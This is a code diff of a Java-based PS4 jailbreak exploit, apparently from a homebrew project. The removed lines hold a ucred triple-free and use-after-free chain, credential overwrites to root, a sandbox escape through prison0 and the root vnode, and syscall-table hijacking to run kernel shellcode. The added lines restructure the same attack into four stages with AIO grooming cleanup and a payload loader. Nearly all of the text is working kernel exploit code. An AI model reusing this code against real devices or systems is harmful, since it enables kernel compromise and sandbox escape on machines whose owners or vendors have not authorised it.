-        long ucred = kread64(curproc + OFFSET_P_UCRED);
-        
-        if ((procFd >>> 48) != 0xFFFF) {
-            console.print("bad procfd");
-            return false;
-        }
-        if ((ucred >>> 48) != 0xFFFF) {
-            console.print("bad ucred");
-            return false;
-        }
-        
-        kwrite32(ucred + 0x04, 0); // cr_uid
-        kwrite32(ucred + 0x08, 0); // cr_ruid
-        kwrite32(ucred + 0x0C, 0); // cr_svuid
-        kwrite32(ucred + 0x10, 1); // cr_ngroups
-        kwrite32(ucred + 0x14, 0); // cr_rgid
-
-        long prison0 = getPrison0();
-        if ((prison0 >>> 48) != 0xFFFF) {
-            console.print("bad prison0");
-            return false;
-        }
-        kwrite64(ucred + 0x30, prison0);
-
-        // Add JIT privileges
-        kwrite64(ucred + 0x60, -1);
-        kwrite64(ucred + 0x68, -1);
-
-        long rootvnode = getRootVnode(0x10);
-        if ((rootvnode >>> 48) != 0xFFFF) {
-            console.print("bad rootvnode");
-            return false;
-        }
-        kwrite64(procFd + 0x10, rootvnode); // fd_rdir
-        kwrite64(procFd + 0x18, rootvnode); // fd_jdir
-        return true;
     }
 
-    private static boolean triggerUcredTripleFree() {
+    // Cleanup function
+    public static void cleanup() {
+
         try {
-            Buffer setBuf = new Buffer(8);
-            Buffer clearBuf = new Buffer(8);
-            msgIov.putLong(0x00, 1); // iov_base
-            msgIov.putLong(0x08, Int8.SIZE); // iov_len
-            int dummySock = socket(AF_UNIX, SOCK_STREAM, 0);
-            setBuf.putInt(0x00, dummySock);
-            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());
-            close(dummySock);
-            setuid(1);
-            uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
-            setuid(1);
-            clearBuf.putInt(0x00, uafSock);
-            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
-            for (int i = 0; i < 32; i++) {
-                iovState.signalWork(0);
-                sched_yield();
-                write(iovSs1, tmp, Int8.SIZE);
-                iovState.waitForFinished();
-                read(iovSs0, tmp, Int8.SIZE);
+            // Close socketpair
+            if (blockFd >= 0) {
+                Helper.syscall(Helper.SYS_CLOSE, (long)blockFd);
+                blockFd = -1;
             }
-            close(dup(uafSock));
-            if (!findTwins(TWIN_TRIES))
-            {
-                console.println("twins failed");
-                return false;
+            if (unblockFd >= 0) {
+                Helper.syscall(Helper.SYS_CLOSE, (long)unblockFd);
+                unblockFd = -1;
             }
 
-            freeRthdr(ipv6Socks[twins[1]]);
-            int timeout = UAF_TRIES;
-            while (timeout-- > 0) {
-                iovState.signalWork(0);
-                sched_yield();
-                leakRthdrLen.set(Int64.SIZE);
-                getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
-                if (leakRthdr.getInt(0x00) == 1) {
-                    break;
+            // Free grooming AIOs
+            if (groomIds != null) {
+                Buffer errors = new Buffer(4 * Helper.MAX_AIO_IDS);
+
+                for (int i = 0; i < NUM_GROOMS; i += Helper.MAX_AIO_IDS) {
+                    int batchSize = Math.min(Helper.MAX_AIO_IDS, NUM_GROOMS - i);
+                    Buffer batchIds = new Buffer(4 * batchSize);
+
+                    for (int j = 0; j < batchSize; j++) {
+                        batchIds.putInt(j * 4, groomIds[i + j]);
+                    }
+
+                    // Poll and delete (no cancel - free_aios2 pattern)
+                    Helper.aioMultiPoll(batchIds.address(), batchSize, errors.address());
+                    Helper.aioMultiDelete(batchIds.address(), batchSize, errors.address());
                 }
-                write(iovSs1, tmp, Int8.SIZE);
-                iovState.waitForFinished();
-                read(iovSs0, tmp, Int8.SIZE);
+                groomIds = null;
             }
-            if (timeout <= 0)
-            {
-                console.println("iov reclaim failed");
-                return false;
+
+            // Unblock and delete blocking AIO
+            if (blockId >= 0) {
+                Buffer blockIdBuf = new Buffer(4);
+                blockIdBuf.putInt(0, blockId);
+                Buffer blockErrors = new Buffer(4);
+
+                Helper.aioMultiWait(blockIdBuf.address(), 1, blockErrors.address(), 1, 0L);
+                Helper.aioMultiDelete(blockIdBuf.address(), 1, blockErrors.address());
+                blockId = -1;
             }
-            triplets[0] = twins[0];
-            close(dup(uafSock));
-            triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-            if (triplets[1] == -1)
-            {
-                console.println("triplets 1 failed");
-                return false;
+
+            // Close sockets
+            if (sockets != null) {
+                for (int i = 0; i < sockets.length; i++) {
+                    if (sockets[i] >= 0) {
+                        Helper.syscall(Helper.SYS_CLOSE, (long)sockets[i]);
+                        sockets[i] = -1;
+                    }
+                }
+                sockets = null;
             }
-            write(iovSs1, tmp, Int8.SIZE);
-            triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-            if (triplets[2] == -1)
-            {
-                console.println("triplets 2 failed");
-                return false;
+
+            // Close socketsAlt
+            if (socketsAlt != null) {
+                for (int i = 0; i < socketsAlt.length; i++) {
+                    if (socketsAlt[i] >= 0) {
+                        Helper.syscall(Helper.SYS_CLOSE, (long)socketsAlt[i]);
+                        socketsAlt[i] = -1;
+                    }
+                }
+                socketsAlt = null;
             }
-            iovState.waitForFinished();
-            read(iovSs0, tmp, Int8.SIZE);
-        } catch (Exception e)
-        {
-            console.println("exception during stage 0");
-            return false;
+
+            // Restore previous core
+            if (previousCore >= 0) {
+                Helper.pinToCore(previousCore);
+                previousCore = -1;
+            }
+
+            // Reset kernel state
+            if (Kernel.addr != null) {
+                Kernel.addr.reset();
+            }
+            kernelRW = null;
+
+        } catch (Exception e) {
         }
-        return true;
-    }
-
-    private static boolean applyKernelPatchesPS4() {
-        try {
-            byte[] shellcode = KernelOffset.getKernelPatchesShellcode();
-            if (shellcode.length == 0) {
-                return false;
-            }
-
-            long sysent661Addr = kBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
-            long mappingAddr = 0x920100000L;
-            long shadowMappingAddr = 0x926100000L;
-
-            int syNarg = kread32(sysent661Addr);
-            long syCall = kread64(sysent661Addr + 8);
-            int syThrcnt = kread32(sysent661Addr + 0x2c);
-            kwrite32(sysent661Addr, 2);
-            kwrite64(sysent661Addr + 8, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
-            kwrite32(sysent661Addr + 0x2c, 1);
-            
-            int PROT_READ = 0x1;
-            int PROT_WRITE = 0x2;
-            int PROT_EXEC = 0x4;
-            int PROT_RW = PROT_READ | PROT_WRITE;
-            int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
-            
-            int alignedMemsz = 0x10000;
-            // create shm with exec permission
-            long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);
-            // create shm alias with write permission
-            long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);
-            // map shadow mapping and write into it
-            Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
-            for (int i = 0; i < shellcode.length; i++) {
-                api.write8(shadowMappingAddr + i, shellcode[i]);
-            }
-            // map executable segment
-            Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
-            Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
-            kwrite32(sysent661Addr, syNarg);
-            kwrite64(sysent661Addr + 8, syCall);
-            kwrite32(sysent661Addr + 0x2c, syThrcnt);
-            Helper.syscall(Helper.SYS_CLOSE, writeHandle);
-        } catch (Exception e)
-        {
-
-        }
-        return true;
     }
 
     public static int main(PrintStream cons) {
-        Poops.console = cons;
+        console = cons;
+        try {
+            initializeExploit();
 
-        // check for jailbreak
-        if (Helper.isJailbroken()) {
-            NativeInvoke.sendNotificationRequest("Already Jailbroken");
+            if (Helper.isJailbroken()) {
+                NativeInvoke.sendNotificationRequest("Already Jailbroken");
+                return 0;
+            }
+            
+            if (!performSetup()) {
+                cleanup();
+                return -3;
+            }
+            
+            // Create socketsAlt for stages
+            socketsAlt = new int[NUM_SDS_ALT];
+            for (int i = 0; i < NUM_SDS_ALT; i++) {
+                socketsAlt[i] = Helper.createUdpSocket();
+            }
+            
+            int[] aliasedPair = executeStage1();
+            if (aliasedPair == null) {
+                cleanup();
+                return -4;
+            }
+            
+            if (!executeStage2(aliasedPair)) {
+                cleanup();
+                return -5;
+            }
+            
+            int[] pktoptsSds = executeStage3(aliasedPair[0]);
+            if (pktoptsSds == null) {
+                cleanup();
+                return -6;
+            }
+            Helper.syscall(Helper.SYS_CLOSE, (long)fakeReqs3Sd);
+            
+            if (!executeStage4(pktoptsSds, reqs1Addr, kernelAddr, sockets, socketsAlt, aioInfoAddr)) {
+                cleanup();
+                return -7;
+            }
+            
+            if (!Kernel.postExploitationPS4()) {
+                cleanup();
+                return -8;
+            }
+            
+            cleanup();
+            BinLoader.start();
             return 0;
-        }
-
-        // perform setup
-        console.println("Pre-configuration");
-        if (!performSetup())
-        {
-            console.println("pre-config failure");
+            
+        } catch (Exception e) {
             cleanup();
-            return -3;
         }
-        console.println("Initial triple free");
-        if (!triggerUcredTripleFree()) {
-            cons.println("triple free failed");
-            cleanup();
-            return -4;
-        }
-
-        // do not print to the console to increase stability here
-        if (!achieveRw(KQUEUE_TRIES)) {
-            cons.println("Leak / RW failed");
-            cleanup();
-            return -6;
-        }
-
-        console.println("Escaping sandbox");
-        if (!escapeSandbox()) {
-            cons.println("Escape sandbox failed");
-            cleanup();
-            return -7;
-        }
-
-        console.println("Patching system");
-        if (!applyKernelPatchesPS4()) {
-            cons.println("Applying patches failed");
-            cleanup();
-            return -8;
-        }
-
-        cleanup();
-
-        BinLoader.start();
-
-        return 0;
-    }
-
-    static class IovThread extends Thread {
-        private final WorkerState state;
-        public IovThread(WorkerState state) {
-            this.state = state;
-        }
-        public void run() {
-            cpusetSetAffinity(4);
-            Helper.setRealtimePriority(256);
-            try {
-                while (true) {
-                    state.waitForWork();
-                    recvmsg(iovSs0, msg, 0);
-                    state.signalFinished();
-                }
-            } catch (InterruptedException e) {
-            }
-        }
-    }
-
-    static class UioThread extends Thread {
-        private final WorkerState state;
-
-        public UioThread(WorkerState state) {
-        this.state = state;
-        }
-        public void run() {
-            cpusetSetAffinity(4);
-            Helper.setRealtimePriority(256);
-            try {
-                while (true) {
-                    int command = state.waitForWork();
-                    if (command == COMMAND_UIO_READ) {
-                        writev(uioSs1, uioIovRead, UIO_IOV_NUM);
-                    } else if (command == COMMAND_UIO_WRITE) {
-                        readv(uioSs0, uioIovWrite, UIO_IOV_NUM);
-                    }
-                    state.signalFinished();
-                }
-            } catch (InterruptedException e) {
-            }
-        }
-    }
-
-    static class WorkerState {
-        private final int totalWorkers;
-
-        private int workersStartedWork = 0;
-        private int workersFinishedWork = 0;
-
-        private int workCommand = -1;
-
-        public WorkerState(int totalWorkers) {
-            this.totalWorkers = totalWorkers;
-        }
-
-        public synchronized void signalWork(int command) {
-            workersStartedWork = 0;
-            workersFinishedWork = 0;
-            workCommand = command;
-            notifyAll();
-
-            while (workersStartedWork < totalWorkers) {
-                try {
-                    wait();
-                } catch (InterruptedException e) {
-                    // Ignore.
-                }
-            }
-        }
-
-        public synchronized void waitForFinished() {
-            while (workersFinishedWork < totalWorkers) {
-                try {
-                    wait();
-                } catch (InterruptedException e) {
-                    // Ignore.
-                }
-            }
-
-            workCommand = -1;
-        }
-
-        public synchronized int waitForWork() throws InterruptedException {
-            while (workCommand == -1 || workersFinishedWork != 0) {
-                wait();
-            }
-
-            workersStartedWork++;
-            if (workersStartedWork == totalWorkers) {
-                notifyAll();
-            }
-
-            return workCommand;
-        }
-
-        public synchronized void signalFinished() {
-            workersFinishedWork++;
-            if (workersFinishedWork == totalWorkers) {
-                notifyAll();
-            }
-        }
+        return -10;
     }
 }
